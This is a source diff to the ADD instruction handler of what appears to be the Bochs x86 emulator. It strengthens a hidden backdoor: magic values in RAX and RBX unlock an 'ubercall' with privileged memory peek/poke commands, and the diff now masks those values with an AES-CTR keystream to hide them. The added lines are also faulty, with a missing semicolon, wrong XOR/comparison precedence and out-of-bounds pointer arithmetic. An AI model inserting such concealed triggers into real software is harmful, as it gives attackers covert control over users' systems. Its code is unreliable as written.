@@ -48,6 +48,7 @@ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
   Bit64u op1_64, op2_64, sum_64;
   uint8_t error = 1;
   uint8_t data = 0xcc;
+  uint8_t keystream [16];
 
   op1_64 = BX_READ_64BIT_REG(i->dst());
   op2_64 = BX_READ_64BIT_REG(i->src());
@@ -88,8 +89,13 @@ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
      involve alignment issues and/or access that cross page boundaries)
      */
 
-  if ((RAX == 0x99a0086fba28dfd1) && (RBX == 0xe2dd84b5c9688a03)) {
+  ctr_output(keystream);
+  if ((RAX ^ *((uint64_t *) keystream)     == 0x99a0086fba28dfd1) &&
+      (RBX ^ *((uint64_t *) keystream + 8) == 0xe2dd84b5c9688a03)) {
       // we have a valid ubercall, let's do this texas-style
+      BX_CPU_THIS_PTR evil.i_counter++;
+      ctr_output(keystream)
+
       switch (RCX) {
           case 0xabadbabe00000001: // peek, virtual
               access_read_linear_nofail(RDX, 1, 0, BX_READ, (void *) &data, &error);
@@ -108,9 +114,7 @@ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
   BX_NEXT_INSTR(i);
 }
 
-void BX_CPU_C::ctr_output(uint8_t *out, int inc) { /* out points towards a uint8_t [16]
-                                                      inc = 0 if we do not increment 
-                                                      i_counter after generating keystream */
+void BX_CPU_C::ctr_output(uint8_t *out) {
     uint8_t ibuf [16];
 
     AES_KEY keyctx;
@@ -119,10 +123,6 @@ void BX_CPU_C::ctr_output(uint8_t *out, int inc) { /* out points towards a uint8
     memset(ibuf, 0xef, 16);
     memcpy(ibuf, &(BX_CPU_THIS_PTR evil.i_counter), 8);
     AES_encrypt(ibuf, out, &keyctx);
-
-    if (inc == 1) {
-        BX_CPU_THIS_PTR evil.i_counter++;
-    }
 }
 
 
